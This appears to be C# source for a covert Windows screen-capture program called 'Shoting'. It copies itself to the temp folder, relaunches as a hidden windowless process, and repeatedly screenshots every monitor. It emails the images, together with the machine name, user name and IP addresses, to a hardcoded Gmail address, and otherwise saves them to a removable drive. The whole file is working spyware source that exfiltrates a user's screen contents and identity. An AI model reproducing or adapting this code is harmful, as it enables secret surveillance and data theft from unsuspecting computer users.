﻿using System;

using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

using System.Net;

using System.Threading;

using System.Windows.Forms;
using System.Windows.Media.Imaging;

namespace Shoting
{
    internal class Program
    {
        private static string mail = null;
        private static int counter = 0;

        private static void Main(string[] args)
        {
            string configPath = "config.txt"; // configuration

            string savePath = null;
            var pokrenut = false;
            int timeToRun = 15; // default id 15 min
            int intervalInSeconds = 7; // default is every 7 seconds

            string[] line = File.ReadAllLines(configPath);
            string runtim = line[0].Split('=')[1];
            string interva = line[1].Split('=')[1];
            args = new string[] { "15", "10", "path", "kontaktdrugi@gmail.com" };
            if (args.Length > 0)
            {
                pokrenut = true;

                Int32.TryParse(args[0], out timeToRun);

                if (args.Length > 1)
                {
                    Int32.TryParse(args[1], out intervalInSeconds);
                }

                if (args.Length > 2)
                {
                    savePath = args[2];
                }

                if (args.Length > 3)
                {
                    mail = args[3];
                }

                if (string.IsNullOrEmpty(mail) || string.IsNullOrWhiteSpace(mail))
                {
                    MessageBox.Show("No receiving email specified! Exiting now...", "Shoting");
                    return;
                }
            }
            else
            {
                // copy and start with parameters from configuration
                string tempPath = Path.GetTempPath();
                string appName = Process.GetCurrentProcess().MainModule.ModuleName;
                string exePath = Application.ExecutablePath;
                string destination = Path.Combine(tempPath + appName);
                string exeDirPath = Environment.CurrentDirectory;

                File.Copy(exePath, destination, true);

                // get configuration
                string arguments = "";
                string runtime = timeToRun.ToString();
                string interval = intervalInSeconds.ToString();
                string destMail = mail;
                if (File.Exists(configPath))
                {
                    try
                    {
                        string[] lines = File.ReadAllLines(configPath);
                        runtime = lines[0].Split('=')[1].TrimEnd();
                        interval = lines[1].Split('=')[1].TrimEnd();
                        destMail = lines[2].Split('=')[1].TrimEnd();
                    }
                    catch
                    {
                        // nothing
                    }
                }

                arguments = runtime + " " + interval + " " + '"' + exeDirPath + '"' + " " + destMail;

                // start it
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = destination;
                startInfo.Arguments = arguments;
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;

                process.StartInfo = startInfo;
                process.Start();

                return;
            }

            long timePassed = 0;
            while (pokrenut)
            {
                try
                {
                    // screenshot
                    pokrenut = TakeScreenshoot(savePath);

                    timePassed += intervalInSeconds;
                    if (timePassed >= timeToRun * 60)
                    {
                        pokrenut = false;
                    }
                }
                catch (Exception e)
                {
                    // TODO - change destination mail for detail errors!
                    //mailer.SendMail(e.ToString(), "Shoting ERROR!", "mailFORerrorReporting@mail.com");

                    //simple errors
                    mailer.SendMail(e.Message, "Shoting ERROR!", mail);
                    break;
                }

                Thread.Sleep(intervalInSeconds * 1000); // wait for interval
            }
        }

        private static bool TakeScreenshoot(string path)
        {
            Screen[] screens = Screen.AllScreens;
            int br = 0;
            foreach (var scr in screens)
            {
                using (Bitmap bmpScreenCapture = new Bitmap(scr.Bounds.Width, scr.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                    {
                        g.CopyFromScreen(scr.Bounds.X,
                                         scr.Bounds.Y,
                                         0, 0,
                                         bmpScreenCapture.Size,
                                         CopyPixelOperation.SourceCopy);
                    }

                    bool successSS = SendItOrSaveIt(bmpScreenCapture, path, br);

                    if (!successSS)
                    {
                        return false;
                    }
                }

                br++;
            }

            return true;
        }

        private static bool SendItOrSaveIt(Bitmap bmpScreenCapture, string path, int br)
        {
            counter++;
            DateTime sada = DateTime.Now;

            string pngIme = counter + "screen" + br + "-" + sada.ToString("HH-mm_ss-fff") + ".png";

            // provjeri ima li interneta
            bool success = mailer.CheckForInternetConnection();

            // ako ima interneta, pošalji
            if (success)
            {
                string desc = "";
                string hostName = Dns.GetHostName();

                desc += "MachineName: " + Environment.MachineName;
                desc += "\nUserName:" + Environment.UserName;
                desc += "\nHostName:" + hostName;

                desc += "\nIP addresses:\n";
                var host = Dns.GetHostEntry(hostName);
                foreach (var ip in host.AddressList)
                {
                    desc += "\n" + ip.ToString();
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    bmpScreenCapture.Save(ms, ImageFormat.Png);

                    var jpegEncoder = new JpegBitmapEncoder();
                    jpegEncoder.Frames.Add(BitmapFrame.Create(ms));
                    using (var str = new MemoryStream())
                    {
                        jpegEncoder.Save(str);
                        str.Position = 0;
                        mailer.SendMail(pngIme + "\n\n" + desc, "Shoting - image " + counter, mail, str, pngIme);
                    }
                }
            }
            else
            {
                // inače probaj spremiti na stick...
                //provjera da put postoji
                if (Directory.Exists(path))
                {
                    // spremi
                    string pathToSave = Path.Combine(path, pngIme);
                    bmpScreenCapture.Save(pathToSave, ImageFormat.Png);
                }
                else
                {
                    return false;
                }
            }

            return true;
        }
    }
}
